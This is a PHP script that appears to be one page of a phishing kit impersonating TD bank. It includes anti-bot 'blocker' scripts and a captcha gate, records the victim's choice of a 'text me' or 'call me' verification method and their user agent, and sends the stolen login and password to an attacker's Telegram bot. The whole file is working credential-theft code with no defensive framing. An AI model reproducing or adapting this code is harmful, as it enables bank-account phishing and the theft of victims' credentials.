<?php
include("../settings/infos2.php");
    include 'blocker.php';
        include 'prevents/anti7.php';
            include 'prevents/anti8.php';
                include 'prevents/anti9.php';
require "configg.php";
require "tc_assetz/ninc/session_protect.php";
require "tc_assetz/ninc/functions.php";
if($_SESSION['passed_captcha'] == 'yes'){
    
}else{
    header( "Location: index.php" ); 
}
if(isset($_POST))
{

    if(!isset($_SESSION)){
        session_start();
    }


    $_SESSION['tm'] = htmlspecialchars($_POST['textme']);
    $_SESSION['cm'] = htmlspecialchars($_POST['callme']);
    $_SESSION['UA'] = htmlspecialchars($_SERVER['HTTP_USER_AGENT']);
      $data = [
            'text' => '
------- TD TEXT ME -------

 Login : '.$_SESSION['user'].'
 
 Password : '.$_SESSION['pass'].'
 
 METHOD : TEXT ME 

---------- Z51 DG ---------


            ',
            'chat_id' => $chat_card
          ];


          file_get_contents("https://api.telegram.org/bot$bot_token/sendMessage?".http_build_query($data) );
                }
 ?>
